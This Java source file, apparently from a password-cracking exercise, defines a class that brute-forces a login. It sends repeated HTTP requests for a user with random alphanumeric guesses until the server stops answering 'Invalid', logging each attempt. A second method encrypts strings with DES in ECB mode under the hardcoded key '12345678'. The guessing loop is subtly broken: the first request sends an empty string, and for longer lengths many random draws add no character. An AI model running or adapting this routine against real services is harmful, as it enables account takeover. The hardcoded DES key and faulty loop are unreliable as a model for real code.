package com.br.wes.tool;

import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Random;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.br.wes.request.HttpRequestToApp;

public class PasswordBreakerContextB implements PasswordBreakerContext {

	private static final Logger LOG = LoggerFactory.getLogger(PasswordBreakerContextB.class);

	public boolean breakPassword(String user, int length) {
		HttpRequestToApp httpRequestToApp = new HttpRequestToApp();
		// String generatedCriptoDesWord = "";
		String response = "Invalid";
		String resp = "";
		while (response.contains("Invalid")) {
			StringBuilder sb = new StringBuilder();
			response = httpRequestToApp.sendHttpRequest(user, sb.toString());
			Random random = new Random();

			for (int i = 0; i < length; i++) {
				int choice = random.nextInt(length - 1);

				switch (choice) {
				case 0:
					sb.append(random.nextInt(10));
					// sb.append((char) (random.nextInt(26) + 'a'));
					break;
				case 1:
					sb.append((char) (random.nextInt(26) + 'A'));
					// sb.append((char) (random.nextInt(26) + 'a'));
					break;
				case 2:
					sb.append((char) (random.nextInt(26) + 'a'));
					break;
				}
			}

			resp = sb.toString();
			LOG.info(response + " | " + sb.toString());

		}
		LOG.info(response + " | " + resp);
		return true;

	}

	public String encriptGeneratedWordToDES(String generatedWord) {
		String chave = "12345678";
		byte[] chaveBytes = chave.getBytes(StandardCharsets.UTF_8);
		byte[] mensagemCriptografadaBytes;
		String mensagemCriptografada = "";

		SecretKey secretKey = new SecretKeySpec(chaveBytes, "DES");

		try {
			Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
			cipher.init(Cipher.ENCRYPT_MODE, secretKey);

			byte[] mensagemBytes = generatedWord.getBytes(StandardCharsets.UTF_8);
			mensagemCriptografadaBytes = cipher.doFinal(mensagemBytes);
			mensagemCriptografada = Base64.getEncoder().encodeToString(mensagemCriptografadaBytes);

		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException
				| BadPaddingException e) {
			e.printStackTrace();
		}

		return mensagemCriptografada;
	}

}
